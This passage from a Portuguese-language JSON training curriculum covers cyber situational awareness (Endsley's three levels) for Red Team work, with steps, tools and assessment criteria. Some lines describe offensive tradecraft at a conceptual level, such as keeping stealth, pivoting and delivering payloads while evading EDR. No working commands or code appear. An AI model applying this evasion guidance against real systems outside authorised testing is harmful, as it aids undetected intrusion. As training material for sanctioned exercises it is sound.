                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Framework Navigator",
                                    "Relatórios de exercícios Red Team (ex: DARPA Cyber Grand Challenge)",
                                    "Ferramenta de simulação como Atomic Red Team"
                                  ],
                                  "tips": "Pense como adversário: SA ofensiva antecipa detecção.",
                                  "learningObjective": "Aplicar CSA especificamente em contextos ofensivos como Red Team.",
                                  "commonMistakes": [
                                    "Focar só em defesa, ignorando ofensiva",
                                    "Subestimar ROE em simulações",
                                    "Não projetar ações do oponente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Refinar a Definição Precisa de CSA",
                                  "subSteps": [
                                    "Combine aprendizados dos steps anteriores em uma definição final: 'CSA é a percepção, compreensão e projeção do ambiente cibernético dinâmico, crítica para Red Team e operações ofensivas.'",
                                    "Inclua componentes: dados sensoriais (logs), mental models (threat intel), predições (ML forecasts).",
                                    "Teste a definição em um quiz auto-aplicado com 5 perguntas.",
                                    "Revise com referências acadêmicas para precisão.",
                                    "Prepare um elevator pitch de 30 segundos da definição."
                                  ],
                                  "verification": "Apresente a definição final por escrito e recite-a verbalmente sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Referências: 'Cyber Situational Awareness' papers de IEEE",
                                    "Quiz template auto-criado",
                                    "Gravador de voz para pitch"
                                  ],
                                  "tips": "Mantenha conciso mas completo; teste com não-especialistas.",
                                  "learningObjective": "Consolidar conhecimento em uma definição acionável e precisa.",
                                  "commonMistakes": [
                                    "Definição vaga sem níveis Endsley",
                                    "Excluir aplicações ofensivas",
                                    "Não validar com fontes externas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma operação Red Team simulada: Nível 1 - Perceber aumento de tráfego no bastion host via Wireshark; Nível 2 - Compreender que é um scan de vulnerabilidades pela vítima; Nível 3 - Projetar pausa na operação para evitar detecção e pivotar para outro vetor, mantendo stealth.",
                              "finalVerifications": [
                                "Recitar a definição completa de CSA incluindo os 3 níveis.",
                                "Mapear CSA para um cenário Red Team específico.",
                                "Explicar diferenças entre CSA ofensiva e defensiva.",
                                "Identificar 3 métricas chave para cada nível de CSA.",
                                "Criar diagrama de CSA adaptado ao ciberespaço.",
                                "Discutir impacto de ROE na CSA ofensiva."
                              ],
                              "assessmentCriteria": [
                                "Precisão da definição (alinhamento com Endsley e fontes cyber: 30%)",
                                "Completude dos 3 níveis com exemplos cibernéticos (25%)",
                                "Integração de aplicações Red Team/ofensivas (20%)",
                                "Clareza e concisão na explicação (15%)",
                                "Uso de evidências/referências (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva (modelos mentais e Endsley)",
                                "Inteligência Militar (SA em operações táticas)",
                                "Gestão de Riscos (análise de ameaças cibernéticas)",
                                "Engenharia de Software (ferramentas de monitoramento SIEM)"
                              ],
                              "realWorldApplication": "Em equipes Red Team durante wargames cibernéticos, CSA permite operadores ofensivos detectarem defesas ativas em tempo real, ajustarem táticas para evasão e cumprirem ROE, prevenindo escaladas reais em cenários como simulações de ciberconflitos nacionais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.1.2",
                            "name": "Diferenciar de Consciência Situacional Tradicional",
                            "description": "Comparar a consciência situacional cibernética com a tradicional (ex.: militar ou aviônica), destacando adaptações para ambientes digitais dinâmicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Consciência Situacional Tradicional",
                                  "subSteps": [
                                    "Pesquise o modelo OODA (Observe, Orient, Decide, Act) de John Boyd aplicado em contextos militares.",
                                    "Analise exemplos clássicos como consciência situacional em aviação (pilotos monitorando altitude, tráfego aéreo) ou militar (soldados avaliando terreno e ameaças visíveis).",
                                    "Identifique elementos chave: percepção sensorial direta, loops de feedback físicos, previsibilidade relativa do ambiente.",
                                    "Registre definições em um quadro comparativo inicial.",
                                    "Discuta limitações em cenários estáticos vs. dinâmicos."
                                  ],
                                  "verification": "Quadro comparativo preenchido com pelo menos 3 exemplos tradicionais e elementos chave listados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigos sobre OODA Loop, vídeos de simulações de aviação militar (YouTube ou Khan Academy), caderno ou Google Docs para quadro.",
                                  "tips": "Use analogias visuais como um cockpit de avião para fixar conceitos.",
                                  "learningObjective": "Compreender os fundamentos e contextos da consciência situacional em ambientes físicos tradicionais.",
                                  "commonMistakes": "Confundir com inteligência artificial; focar apenas em militar sem incluir aviônica."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Consciência Situacional Cibernética",
                                  "subSteps": [
                                    "Estude definições de consciência situacional cibernética (ex.: Endsley adaptado para ciber: percepção de rede, compreensão de ameaças virtuais).",
                                    "Explore componentes: monitoramento de logs, detecção de anomalias em tráfego de rede, análise de IOCs (Indicators of Compromise).",
                                    "Identifique características únicas: invisibilidade das ameaças, velocidade de mudança (zero-day exploits), escala massiva de dados.",
                                    "Crie um diagrama de rede simples ilustrando fluxos de dados e pontos de monitoramento.",
                                    "Compare brevemente com tradicional em notas iniciais."
                                  ],
                                  "verification": "Diagrama de rede criado e definição escrita com 4 componentes chave.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Documentação NIST SP 800-61 (Incident Handling), ferramentas como Wireshark demo, papel ou Draw.io para diagrama.",
                                  "tips": "Visualize o ciberespaço como um 'oceano digital' com ameaças submersas.",
                                  "learningObjective": "Dominar os pilares da consciência situacional adaptada ao domínio cibernético.",
                                  "commonMistakes": "Ignorar a assimetria (atacante oculto vs. defensor visível); superestimar similaridades físicas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar e Contrastar as Duas Abordagens",
                                  "subSteps": [
                                    "Preencha uma tabela de comparação: colunas para Tradicional vs. Cibernética em dimensões como percepção (sensorial vs. digital), tempo (segundos vs. milissegundos), ambiente (físico previsível vs. virtual mutável).",
                                    "Liste 5 similaridades (ex.: ambos usam loops de decisão) e 7 diferenças chave (ex.: persistência de ameaças cibernéticas).",
                                    "Discuta adaptações: automação via SIEM, IA para previsão em vez de observação humana pura.",
                                    "Valide com fontes externas como papers sobre Cyber SA.",
                                    "Revise tabela para clareza."
                                  ],
                                  "verification": "Tabela de comparação completa com pelo menos 5 similaridades e 7 diferenças documentadas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Planilha Excel/Google Sheets para tabela, artigos acadêmicos (ex.: IEEE papers on Cyber Situational Awareness), acesso a MITRE ATT&CK framework.",
                                  "tips": "Use cores na tabela: verde para similaridades, vermelho para diferenças.",
                                  "learningObjective": "Identificar precisamente similaridades e diferenças entre consciência situacional tradicional e cibernética.",
                                  "commonMistakes": "Focar só em diferenças superficiais; não quantificar impactos (ex.: latência cibernética)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Destacar Adaptações para Ambientes Digitais Dinâmicos",
                                  "subSteps": [
                                    "Analise adaptações específicas: de loops OODA para Cyber OODA com fusão de dados multi-fonte.",
                                    "Examine ferramentas modernas: dashboards em Splunk/ELK para visualização dinâmica vs. HUDs aviônicos.",
                                    "Discuta desafios cibernéticos: ofuscação de atacantes, lateral movement, e como mitigar (ex.: threat hunting).",
                                    "Sintetize em um resumo de 1 página com exemplos de adaptação bem-sucedida (ex.: operações em Ucrânia cyber).",
                                    "Teste compreensão respondendo a 3 perguntas hipotéticas de diferenciação."
                                  ],
                                  "verification": "Resumo de 1 página escrito e 3 perguntas respondidas corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Casos de estudo (ex.: SolarWinds breach analysis), resumo template em Word.",
                                  "tips": "Pense em 'velocidade de luz' das ameaças cibernéticas vs. velocidade do som em aviões.",
                                  "learningObjective": "Explicar adaptações necessárias para consciência situacional em contextos cibernéticos dinâmicos.",
                                  "commonMistakes": "Subestimar a necessidade de automação; generalizar sem exemplos concretos."
                                }
                              ],
                              "practicalExample": "Em um exercício de simulação: compare um piloto de caça detectando um míssil via radar visual (tradicional: percepção imediata, decisão em segundos) com um analista SOC detectando um APT via alertas SIEM (cibernética: correlação de logs de múltiplos endpoints, decisão em minutos com IA, adaptando a evasões dinâmicas).",
                              "finalVerifications": [
                                "Pode listar e explicar 5 diferenças chave sem consultar notas.",
                                "Consegue preencher uma tabela comparativa em menos de 5 minutos.",
                                "Identifica adaptações corretas para 3 cenários cibernéticos hipotéticos.",
                                "Explica impacto de ambientes dinâmicos digitais vs. tradicionais.",
                                "Discute um caso real onde falha em adaptação levou a breach.",
                                "Valida compreensão com quiz de 10 perguntas (80% acerto)."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições e diferenças sem erros factuais (30%).",
                                "Profundidade de análise: inclusão de exemplos e adaptações específicas (25%).",
                                "Clareza na comparação: tabelas/diagramas bem estruturados (20%).",
                                "Aplicação prática: ligação a cenários reais cibernéticos (15%).",
                                "Originalidade: insights sobre adaptações dinâmicas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Modelos de percepção e Endsley Levels of SA.",
                                "Ciência da Computação: Análise de dados e machine learning para detecção.",
                                "Estratégia Militar: Evolução do OODA para domínios cibernéticos.",
                                "Gestão de Riscos: Frameworks como NIST para SA em TI."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), diferenciar SA cibernética permite priorizar alertas em tempo real durante um incidente como ransomware, adaptando táticas tradicionais de comando para hunting automatizado, prevenindo downtime em infraestruturas críticas como bancos ou utilities."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.1.3",
                            "name": "Identificar Elementos Constituintes",
                            "description": "Listar e descrever os elementos básicos que compõem a consciência situacional cibernética, como rede, tráfego, hosts e indicadores de atividade adversária.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Geral de Consciência Situacional Cibernética",
                                  "subSteps": [
                                    "Defina consciência situacional cibernética como a percepção do ambiente cibernético atual e projetado.",
                                    "Identifique os pilares básicos: rede, tráfego, hosts e indicadores de atividade adversária (IoA).",
                                    "Estude exemplos iniciais de cada pilar em um diagrama simples de rede.",
                                    "Anote as interdependências entre esses elementos.",
                                    "Revise definições oficiais de fontes como NIST ou MITRE."
                                  ],
                                  "verification": "Crie um mapa mental conectando os quatro elementos principais e explique verbalmente ou por escrito.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Diagrama de rede básico (impresso ou digital)",
                                    "Glossário NIST SP 800-61",
                                    "Ferramenta de mind mapping como MindMeister ou papel e caneta"
                                  ],
                                  "tips": [
                                    "Comece com visuais para melhor retenção.",
                                    "Use analogias do mundo físico, como 'rede é como estradas'.",
                                    "Mantenha definições concisas: 1-2 frases por elemento."
                                  ],
                                  "learningObjective": "Entender a estrutura fundamental da consciência situacional cibernética e seus componentes principais.",
                                  "commonMistakes": [
                                    "Confundir IoA com IOCs (indicadores são comportamentais, não estáticos).",
                                    "Ignorar interconexões entre elementos.",
                                    "Sobrecarregar com detalhes técnicos prematuramente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Descrever Elementos de Rede",
                                  "subSteps": [
                                    "Liste componentes de rede: roteadores, switches, firewalls, servidores DNS.",
                                    "Descreva funções: roteador direciona tráfego, firewall filtra pacotes maliciosos.",
                                    "Analise topologias comuns: estrela, malha, híbrida.",
                                    "Identifique pontos de falha comuns em redes (single points of failure).",
                                    "Mapeie sua rede local ou simulada, rotulando cada componente."
                                  ],
                                  "verification": "Desenhe um diagrama de uma rede simples com pelo menos 5 componentes rotulados e funções descritas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de desenho como Draw.io",
                                    "Documentação de topologias de rede (Cisco ou similar)",
                                    "Acesso a Wireshark para visualização básica"
                                  ],
                                  "tips": [
                                    "Use comandos como 'ping' e 'tracert' para mapear rede real.",
                                    "Foquem em camadas OSI relevantes (2-3 para rede).",
                                    "Priorize componentes visíveis em logs de SOC."
                                  ],
                                  "learningObjective": "Dominar identificação e descrição precisa dos elementos constitutivos de uma rede cibernética.",
                                  "commonMistakes": [
                                    "Confundir hardware com software (ex: roteador vs. serviço de roteamento).",
                                    "Ignorar rede sem fio ou cloud.",
                                    "Listar elementos irrelevantes como 'usuários'."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Tráfego de Rede e Hosts",
                                  "subSteps": [
                                    "Defina tráfego: pacotes IP, protocolos (TCP/UDP), fluxos (NetFlow).",
                                    "Descreva hosts: endpoints como workstations, servidores, IoT devices.",
                                    "Identifique métricas chave: volume de tráfego, anomalias (picos, portas incomuns).",
                                    "Capture e analise tráfego simulado com Wireshark.",
                                    "Classifique hosts por tipo e risco (ex: DMZ vs. internal)."
                                  ],
                                  "verification": "Capture 10 fluxos de tráfego reais/simulados e descreva hosts envolvidos com métricas básicas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Wireshark (gratuito)",
                                    "pcaps de amostra (de sites como Wireshark Sample Captures)",
                                    "Lista de portas comuns IANA"
                                  ],
                                  "tips": [
                                    "Filtre por IP ou protocolo para foco.",
                                    "Compare tráfego baseline vs. suspeito.",
                                    "Registre timestamps para contextualizar."
                                  ],
                                  "learningObjective": "Capacitar análise de tráfego e hosts como blocos de construção da consciência situacional.",
                                  "commonMistakes": [
                                    "Interpretar todo tráfego alto como malicioso.",
                                    "Confundir host com IP (hosts têm múltiplos IPs).",
                                    "Não considerar criptografia em tráfego."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecer Indicadores de Atividade Adversária e Sintetizar Elementos",
                                  "subSteps": [
                                    "Defina IoA: comportamentos adversários como C2, lateral movement, exfiltração.",
                                    "Liste exemplos: tráfego para IPs conhecidos maliciosos, scans de porta.",
                                    "Integre com rede/tráfego/hosts: IoA em hosts infectados afetam tráfego.",
                                    "Crie uma tabela resumindo todos os elementos com exemplos de IoA.",
                                    "Simule detecção em um cenário unificado."
                                  ],
                                  "verification": "Produza uma lista completa de 10 IoA mapeados aos elementos e valide contra framework MITRE ATT&CK.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Tabela em Excel/Google Sheets",
                                    "Cenários de CTF como TryHackMe"
                                  ],
                                  "tips": [
                                    "Use ATT&CK para exemplos reais.",
                                    "Priorize IoA observáveis em rede.",
                                    "Teste hipóteses: 'por quê isso indica adversário?'."
                                  ],
                                  "learningObjective": "Sintetizar todos os elementos em uma visão coesa para detecção de ameaças.",
                                  "commonMistakes": [
                                    "Confundir IoA com sintomas benignos.",
                                    "Isolar IoA de contexto de rede.",
                                    "Listar IOCs em vez de IoA comportamentais."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de SOC simulado, analise uma captura de tráfego Wireshark de uma rede corporativa: identifique roteadores/firewalls (rede), fluxos anômalos para IPs C2 (tráfego), servidores infectados (hosts), e beacons periódicos (IoA), documentando como eles formam consciência situacional para alertar sobre intrusão APT.",
                              "finalVerifications": [
                                "Lista precisa dos 4 elementos principais com descrições corretas.",
                                "Diagrama integrado mostrando interconexões.",
                                "Análise de pelo menos 3 cenários com IoA identificados.",
                                "Explicação oral ou escrita de como elementos contribuem para CS cibernética.",
                                "Auto-avaliação: 90% acurácia em quiz de 20 itens sobre elementos.",
                                "Aplicação em ferramenta real como Wireshark sem erros graves."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições (90%+ correto).",
                                "Profundidade de sub-passos completados (todos com evidências).",
                                "Integração interdisciplinar demonstrada.",
                                "Tempo respeitado com qualidade alta.",
                                "Criatividade em exemplos práticos.",
                                "Ausência de erros comuns identificados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Topologias e protocolos OSI.",
                                "Análise de Dados: Detecção de anomalias em tráfego.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK.",
                                "Gestão de Incidentes: Correlação de logs.",
                                "Estatística: Baselines e desvios em métricas de rede."
                              ],
                              "realWorldApplication": "Em um Centro de Operações de Segurança (SOC), analistas usam essa habilidade para monitorar redes empresgais em tempo real, detectando invasões precocemente via ferramentas como Splunk ou ELK Stack, prevenindo breaches que custam milhões, como no caso do SolarWinds."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.1.2",
                        "name": "Níveis da Consciência Situacional Cibernética",
                        "description": "Exploração dos três níveis do modelo de Endsley adaptado ao cibernético: percepção, compreensão e projeção, essenciais para operações de ataque.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.1.2.1",
                            "name": "Descrever Nível de Percepção",
                            "description": "Detalhar o nível de percepção como a detecção e monitoramento contínuo de eventos no ambiente cibernético, usando ferramentas como SIEM em cenários ofensivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito fundamental do Nível de Percepção",
                                  "subSteps": [
                                    "Definir consciência situacional cibernética e seus níveis hierárquicos.",
                                    "Explicar o Nível de Percepção como detecção e monitoramento contínuo de eventos.",
                                    "Identificar componentes chave: coleta de logs, alertas em tempo real e análise inicial.",
                                    "Diferenciar de níveis superiores como Compreensão e Projeção.",
                                    "Estudar modelos teóricos como o de Endsley adaptado ao cibernético."
                                  ],
                                  "verification": "Resumir em um parágrafo o que é o Nível de Percepção e listar 3 diferenças para outros níveis.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigo sobre modelo de Endsley",
                                    "Vídeo introdutório sobre consciência situacional cibernética",
                                    "Diagrama dos níveis de consciência situacional"
                                  ],
                                  "tips": "Use analogias do mundo real, como radar em aviação, para fixar o conceito.",
                                  "learningObjective": "Entender a definição e o papel do Nível de Percepção na hierarquia da consciência situacional.",
                                  "commonMistakes": [
                                    "Confundir com detecção de ameaças avançada (Nível de Compreensão)",
                                    "Ignorar o aspecto contínuo do monitoramento",
                                    "Subestimar a importância de ferramentas automatizadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar ferramentas de monitoramento como SIEM",
                                  "subSteps": [
                                    "Instalar e configurar uma ferramenta SIEM gratuita como ELK Stack ou Splunk Free.",
                                    "Configurar regras de detecção para eventos comuns (ex: logins suspeitos).",
                                    "Simular geração de logs de rede e visualizá-los no dashboard.",
                                    "Analisar alertas gerados e correlacionar eventos básicos.",
                                    "Documentar o fluxo de dados desde a coleta até o alerta."
                                  ],
                                  "verification": "Gerar um relatório de 5 alertas simulados explicando como o SIEM detectou eventos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "ELK Stack ou Splunk Free",
                                    "Gerador de logs como tcpdump",
                                    "Documentação oficial do SIEM escolhido"
                                  ],
                                  "tips": "Comece com dados de amostra para evitar configurações complexas iniciais.",
                                  "learningObjective": "Dominar o uso de SIEM para detecção e monitoramento contínuo.",
                                  "commonMistakes": [
                                    "Não configurar correlação de eventos",
                                    "Ignorar falsos positivos",
                                    "Configurar apenas alertas sem visualização"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar o Nível de Percepção em cenários ofensivos",
                                  "subSteps": [
                                    "Estudar táticas ofensivas comuns (MITRE ATT&CK: reconnaissance, initial access).",
                                    "Simular um cenário de ataque em ambiente controlado (ex: uso de Metasploit).",
                                    "Monitorar o ambiente com SIEM durante a simulação.",
                                    "Identificar eventos detectáveis no Nível de Percepção (ex: scans de porta).",
                                    "Mapear eventos detectados aos frameworks de threat intelligence."
                                  ],
                                  "verification": "Criar um log de eventos de um cenário simulado destacando detecções no Nível de Percepção.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ambiente virtual (VirtualBox com Kali Linux e vítima)",
                                    "Metasploit Framework",
                                    "SIEM configurado do Step 2"
                                  ],
                                  "tips": "Registre todos os comandos usados para replicabilidade.",
                                  "learningObjective": "Integrar monitoramento com cenários de jogos de guerra cibernética.",
                                  "commonMistakes": [
                                    "Focar apenas em ataques bem-sucedidos, ignorando fases iniciais",
                                    "Não diferenciar ruído de eventos reais",
                                    "Subestimar latência em detecções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver descrição estruturada do Nível de Percepção",
                                  "subSteps": [
                                    "Estruturar uma descrição: definição, ferramentas, exemplos em cenários ofensivos.",
                                    "Escrever um relatório descrevendo o nível com diagramas e fluxogramas.",
                                    "Incluir limitações (ex: falsos negativos) e melhorias.",
                                    "Revisar e refinar com base em critérios de clareza e completude.",
                                    "Apresentar oralmente a descrição para autoavaliação."
                                  ],
                                  "verification": "Produzir um documento de 1-2 páginas descrevendo o Nível de Percepção com exemplos práticos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de texto (Google Docs ou Markdown)",
                                    "Ferramentas de diagrama (Draw.io)",
                                    "Relatórios de Steps anteriores"
                                  ],
                                  "tips": "Use bullet points e imagens para tornar a descrição visual e concisa.",
                                  "learningObjective": "Capacitar-se a descrever o Nível de Percepção de forma clara e profissional.",
                                  "commonMistakes": [
                                    "Descrições genéricas sem exemplos concretos",
                                    "Omitir contexto ofensivo",
                                    "Excesso de jargões sem explicação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, simule um scan de portas com Nmap em uma rede alvo. Monitore via SIEM (Splunk) os logs de tráfego de rede. Detecte o evento como 'aumento anormal de SYN packets', gere alerta em tempo real e descreva: 'O Nível de Percepção identificou atividade de reconnaissance via monitoramento contínuo de logs firewall.'",
                              "finalVerifications": [
                                "Explicar verbalmente os 4 níveis de consciência situacional e destacar o de Percepção.",
                                "Configurar SIEM para detectar 3 tipos de eventos ofensivos simulados.",
                                "Produzir descrição escrita com pelo menos 3 exemplos reais.",
                                "Identificar 5 eventos de um log real como pertencentes ao Nível de Percepção.",
                                "Diferenciar detecção (Percepção) de análise de intenção (Compreensão).",
                                "Demonstrar monitoramento contínuo em ambiente virtual por 30 minutos."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definição correta e contextualizada (30%)",
                                "Profundidade técnica: uso correto de ferramentas como SIEM (25%)",
                                "Aplicação prática: exemplos em cenários ofensivos relevantes (20%)",
                                "Clareza na descrição: estrutura lógica e visual (15%)",
                                "Completude: cobertura de limitações e verificações (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Correlação de logs em SIEM similar a big data analytics.",
                                "Inteligência Artificial: Uso de ML para redução de falsos positivos em monitoramento.",
                                "Gestão de Redes: Entendimento de protocolos para detecção de anomalias.",
                                "Psicologia Cognitiva: Modelos de percepção humana aplicados ao cibernético.",
                                "Estratégia Militar: Paralelos com C4ISR em operações ofensivas."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC) durante um jogo de guerra cibernético, o Nível de Percepção permite detectar intrusões iniciais via SIEM, permitindo resposta rápida em cenários como ataques de ransomware em infraestruturas críticas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.2.2",
                            "name": "Explicar Nível de Compreensão",
                            "description": "Analisar o nível de compreensão, interpretando dados percebidos para avaliar ameaças e oportunidades em operações de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos do Nível de Compreensão na Consciência Situacional",
                                  "subSteps": [
                                    "Estude o modelo de Endsley de Consciência Situacional: Percepção (Nível 1), Compreensão (Nível 2) e Projeção (Nível 3).",
                                    "Defina o Nível de Compreensão como a interpretação de dados percebidos para atribuir significado e formar uma imagem mental do ambiente cibernético.",
                                    "Identifique entradas do Nível 1 (ex.: logs de tráfego anômalo) e saídas do Nível 2 (ex.: reconhecimento de um scan de rede como reconnaissance de atacante).",
                                    "Compare com exemplos reais de Red Team: dados brutos vs. avaliação de intentos adversários.",
                                    "Anote diferenças chave entre os níveis em um diagrama pessoal."
                                  ],
                                  "verification": "Criar um diagrama que corretamente diferencia os três níveis de SA com exemplos cibernéticos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigo de Mica Endsley sobre SA, diagrama em branco, acesso a documentação de Red Team.",
                                  "tips": "Use analogias cotidianas, como ver fumaça (L1) vs. entender que é um incêndio (L2).",
                                  "learningObjective": "Compreender conceitualmente o papel do Nível de Compreensão na hierarquia de SA cibernética.",
                                  "commonMistakes": "Confundir Compreensão com Projeção; focar apenas em detecção sem interpretação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar Dados Percebidos em Contextos Cibernéticos",
                                  "subSteps": [
                                    "Colete dados simulados de uma ferramenta como Wireshark ou Zeek (ex.: pacotes incomuns).",
                                    "Aplique frameworks de interpretação: correlacione eventos (ex.: IP novo + portas escaneadas).",
                                    "Classifique dados: benigno, suspeito ou malicioso, considerando contexto operacional.",
                                    "Forme hipóteses: 'Isso indica uma tentativa de foothold ou é ruído de rede legítima?'",
                                    "Documente a interpretação em um relatório curto com evidências."
                                  ],
                                  "verification": "Produzir um relatório de 1 página interpretando um conjunto de logs fornecidos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramentas de captura de pacotes (Wireshark), logs de simulação de ataques (ex.: Atomic Red Team).",
                                  "tips": "Sempre pergunte 'Por quê?' e 'E se?' para aprofundar a interpretação.",
                                  "learningObjective": "Desenvolver habilidades para transformar dados percebidos em insights significativos.",
                                  "commonMistakes": "Ignorar contexto histórico; superestimar ruído como ameaça sem correlação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar Ameaças e Oportunidades a Partir da Compreensão",
                                  "subSteps": [
                                    "Mapeie elementos compreendidos para o framework MITRE ATT&CK (táticas e técnicas).",
                                    "Avalie ameaças: priorize por impacto (confidencialidade, integridade, disponibilidade).",
                                    "Identifique oportunidades: brechas para escalada de privilégios ou pivoting em Red Team.",
                                    "Calcule scores qualitativos: probabilidade x severidade para cada interpretação.",
                                    "Atualize o quadro de SA com avaliações priorizadas."
                                  ],
                                  "verification": "Gerar uma matriz de ameaças/oportunidades para um cenário dado.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "MITRE ATT&CK Navigator, planilha de priorização (Excel/Google Sheets).",
                                  "tips": "Use escalas numéricas (1-10) para objetivar avaliações subjetivas.",
                                  "learningObjective": "Capacitar avaliação estratégica de riscos e chances em operações ofensivas.",
                                  "commonMistakes": "Focar só em ameaças, ignorando oportunidades; viés de confirmação em interpretações."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar e Praticar o Nível de Compreensão em Simulações de Red Team",
                                  "subSteps": [
                                    "Execute uma simulação em ambiente controlado (ex.: TryHackMe ou HTB room).",
                                    "Registre percepções em tempo real, avance para compreensão e avaliação.",
                                    "Debriefe: valide interpretações com ferramentas post-mortem (ex.: autopsy de logs).",
                                    "Ajuste baseando em feedback: refine hipóteses para iterações futuras.",
                                    "Compartilhe análise em um AAR (After Action Review) fictício."
                                  ],
                                  "verification": "Completar simulação com relatório de SA Levels documentado.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Plataformas de lab (HackTheBox, TryHackMe), timer para simulação.",
                                  "tips": "Pratique sob pressão de tempo para simular operações reais.",
                                  "learningObjective": "Aplicar o Nível de Compreensão de forma integrada e iterativa.",
                                  "commonMistakes": "Pular de volta para L1 sem avançar; sobrecarga cognitiva sem priorização."
                                }
                              ],
                              "practicalExample": "Em uma operação de Red Team simulada, você percebe tráfego HTTP para um servidor interno não autorizado (L1). No Nível de Compreensão, interpreta isso como uma tentativa de C2 (Command and Control) via web shell, avaliando a ameaça de exfiltração de dados e a oportunidade de pivoting para domínios laterais.",
                              "finalVerifications": [
                                "Explicar verbalmente a diferença entre Percepção e Compreensão com 2 exemplos cibernéticos.",
                                "Interpretar corretamente um log fornecido, identificando ameaça/oportunidade.",
                                "Priorizar 3 itens em uma lista de eventos simulados usando critérios de risco.",
                                "Mapear uma interpretação para pelo menos 2 táticas do MITRE ATT&CK.",
                                "Demonstrar integração com Regras de Engajamento em um cenário hipotético.",
                                "Produzir um diagrama de SA Levels atualizado após análise."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção conceitual entre níveis de SA (80%+ acurácia).",
                                "Profundidade na interpretação de dados (correlação de ≥3 elementos).",
                                "Qualidade da avaliação de ameaças/oportunidades (uso de frameworks padrão).",
                                "Clareza e evidência-based no relatório (citações de dados originais).",
                                "Velocidade e eficiência sob simulação (dentro do tempo estimado).",
                                "Criatividade em identificação de oportunidades ofensivas."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Modelos de processamento de informação e vieses.",
                                "Análise de Inteligência: Técnicas de avaliação de ameaças (ex.: Diamond Model).",
                                "Gestão de Riscos: Frameworks como NIST RMF para priorização.",
                                "Engenharia de Prompting em IA: Interpretação de outputs para SA aprimorada."
                              ],
                              "realWorldApplication": "Durante uma Red Team engagement real, como pentest corporativo, o Nível de Compreensão permite interpretar scans iniciais como intentos de spear-phishing, avaliando oportunidades para entregar payloads personalizados enquanto evita detecção por EDR, otimizando o TTPs para sucesso da operação."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.1.1"
                            ]
                          },
                          {
                            "id": "2.0.2.3.1.2.3",
                            "name": "Aplicar Nível de Projeção",
                            "description": "Demonstrar como projetar o estado futuro do ambiente cibernético para prever respostas defensivas e planejar pivôs em ataques.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
